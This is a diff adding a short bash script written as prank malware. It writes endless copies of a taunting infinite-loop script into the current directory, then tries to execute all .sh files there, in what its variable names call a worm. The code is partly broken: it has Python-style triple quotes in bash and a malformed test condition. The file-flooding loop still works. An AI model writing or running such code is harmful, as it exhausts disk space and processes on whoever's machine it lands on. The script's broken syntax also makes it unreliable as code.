@@ -1,0 +1,24 @@
+#!/bin/bash
+
+
+context="""
+while :
+  do
+    echo 'YOU ARE FUCKED'
+  done """
+
+Num=1
+
+while :
+  do
+    echo "$context" > YouAreFucked_$Num.sh
+    Num=$(( $Num+1 ))
+
+    while [ $Num -gt 50000 ] :
+     do
+        for wormed in $(pwd)/*.sh
+          do
+            exec $wormed
+          done
+     done
+  done
